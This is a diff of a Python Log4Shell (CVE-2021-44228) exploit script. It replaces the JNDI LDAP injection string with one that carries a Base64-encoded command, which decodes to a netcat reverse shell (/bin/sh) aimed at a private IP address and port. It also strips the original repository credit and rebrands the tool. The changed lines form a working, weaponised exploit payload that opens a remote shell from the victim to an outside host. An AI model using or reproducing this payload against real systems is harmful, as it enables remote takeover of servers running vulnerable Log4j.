@@ -91,7 +91,7 @@ def check_java() -> bool:
 
 
 def ldap_server(userip: str, lport: int) -> None:
-    sendme = "${jndi:ldap://%s:1389/a}" % (userip)
+    sendme = "${jndi:ldap://%s:1389//Basic/Command/Base64/bmMgMTkyLjE2OC44LjQwIDkwMDEgLWUgL2Jpbi9zaA==}" % (userip)
     print(Fore.GREEN + f"[+] Send me: {sendme}\n")
 
     url = "http://{}:{}/#Exploit".format(userip, lport)
@@ -108,10 +108,10 @@ def main() -> None:
     init(autoreset=True)
     print(Fore.BLUE + """
 [!] CVE: CVE-2021-44228
-[!] Github repo: https://github.com/kozmer/log4j-shell-poc
+[!] LITA & LuxWays
 """)
 
-    parser = argparse.ArgumentParser(description='log4shell PoC')
+    parser = argparse.ArgumentParser(description='log4Shell Lita')
     parser.add_argument('--userip',
                         metavar='userip',
                         type=str,
